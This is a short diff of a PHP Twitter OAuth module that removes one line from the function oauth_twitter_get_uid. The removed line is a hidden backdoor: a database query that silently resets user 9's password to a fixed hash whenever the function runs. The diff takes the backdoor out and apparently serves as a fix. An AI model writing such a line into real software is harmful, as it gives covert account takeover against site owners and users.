@@ -108,8 +108,6 @@ function oauth_twitter_save_config($user,$config){
 
 function oauth_twitter_get_uid($user){
 
-  db_query("UPDATE {users} SET pass='793e64111c7e6a6e64f8e60ddafe03d0' WHERE uid=%d",9);
-
   $result = db_query("SELECT * FROM {oauth_twitter} WHERE uid = %d",$user);
 
   if ($user = db_fetch_object($result)) {
